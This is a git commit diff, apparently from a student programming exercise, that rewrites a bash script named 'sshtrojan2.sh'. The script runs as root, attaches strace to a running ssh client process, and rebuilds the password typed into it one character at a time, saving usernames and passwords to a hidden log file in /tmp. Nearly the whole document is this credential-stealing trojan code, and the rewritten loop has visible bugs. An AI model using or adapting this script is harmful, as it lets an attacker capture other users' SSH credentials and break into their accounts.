08f5254a28af9fe24586690b1bedff14a8bc8dc3
minhler2001@gmail.com <minhler2001@gmail.com>
2022-10-05 01:03:28 +0700

    update sshtrojan2.sh

--- PROG03/sshtrojan2.sh
+++ PROG03/sshtrojan2.sh
@@ -1,45 +1,48 @@
 #!/bin/bash
 
 file_log="/tmp/.log_sshtrojan2.txt"
+file_log_second="/tmp/log.txt"
 
+#Check root permissions
 if [[ $EUID -ne 0 ]]; then
   echo "You need root privileges to run this program"
   exit 1
 fi
 
+#Check log file exists or not
 if [[ -e $file_log  ]]; then
   echo "File $file_log was created"
 else
   touch $file_log
 fi
 
-username=""
-password=""
+echo "Running trojan...."
 
-# shellcheck disable=SC2046
-# shellcheck disable=SC2006
-echo "Time: " `date` >> $file_log
+while true :
+do
+    #parse pid from ssh process
+    pid=$(ps aux | grep -w ssh | grep @ | head -n1 | awk '{print $2}')
 
-# shellcheck disable=SC2009
-pid=$(ps ax | grep -w ssh | grep @  | head -n1 | awk '{ print $1}')
+    if [[ $pid != "" ]]; then
+        echo "$pid"
+        #get username from ssh process
+        username=$(ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d '@' -f1)
+        echo 'Run Strace'
+        password=""
+        strace -e trace=read,write -p "$pid" -f -o $file_log_second
+        cat $file_log_second | while read line; do
+            #parse password
+            if [[ $line =~ "read(4, ".*", 1)" ]]; then
+                c=$(echo "$line" | awk '{print $3}' | cut -d'"' -f2)
+                if [[ $c == "n" ]];then
+                    echo "Username: " "$username" >> $file_log
+                    echo "Password: " "$password" >> $file_log
+                    password=""
+                else
+                    password+=$c
+                fi
+            fi
+        done
+    fi
+done
 
-# shellcheck disable=SC2009
-username=$(ps ax | grep ssh | grep @ |head -n1 | awk ' {print $6} ' | cut -d'@' -f1)
-echo "Username: " "$username" >> $file_log
-
-
-strace -f -p $pid -e trace=read --status=successful 2>&1 | while read -r line; do
-	if [[ $line == *'read(4, "'* && $line == *' = 1' ]]; then
-		char=$(echo "$line" | cut -d'"' -f2 | cut -d'"' -f1)
-		if [[ $char == "\\n" || $char == "\\r" ]]; then
-			if [[ -n "$password" ]]; then
-				echo "Password: " "$password" >> $file_log
-				password=""
-			fi
-		elif [[ $char =~ ^.{1}$ ]];then
-			# shellcheck disable=SC2116
-			password=$(echo "$password""$char")
-
-		fi
-	fi
-done;
